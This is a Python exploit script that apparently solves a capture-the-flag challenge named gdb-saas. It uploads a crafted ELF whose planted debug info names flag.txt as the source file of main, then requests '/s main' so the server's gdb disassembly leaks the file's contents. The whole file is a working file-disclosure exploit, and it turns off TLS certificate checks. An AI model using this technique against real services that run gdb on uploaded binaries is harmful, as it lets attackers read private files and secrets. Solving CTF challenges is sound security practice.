#!/usr/bin/env python3
# gdb-saas exploit client.
#
# Sends the payload ELF (base64) and the function name "/s main" to the
# service. The server runs `gdb -ex "disassemble /s main"` on our ELF;
# gdb treats flag.txt as the source file of main (per the debug info we
# planted) and prints its first line - the flag.
#
# Usage:
#   python3 solve.py [elf] [host] [port]
import base64
import socket
import ssl
import sys

HOST = 'gdb-saas-<...>.inst19.ctf.fortid.com'
PORT = 1337
ELF = sys.argv[1] if len(sys.argv) > 1 else 'elf.bin'
FUNC = '/s main'


def recv_until(sock, marker, timeout=15):
    data = b''
    sock.settimeout(timeout)
    try:
        while marker not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def main():
    host = sys.argv[2] if len(sys.argv) > 2 else HOST
    port = int(sys.argv[3]) if len(sys.argv) > 3 else PORT

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, port), timeout=15)
    s = ctx.wrap_socket(raw, server_hostname=host)

    recv_until(s, b'base64): ')
    data = open(ELF, 'rb').read()
    b64 = base64.b64encode(data)
    if len(b64) >= 30 * 1024:
        sys.exit('payload too large: %d bytes of base64' % len(b64))
    s.sendall(b64 + b'\n')

    recv_until(s, b'function name: ')
    s.sendall(FUNC.encode() + b'\n')

    out = b''
    s.settimeout(12)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    print(out.decode('utf-8', 'replace'))


if __name__ == '__main__':
    main()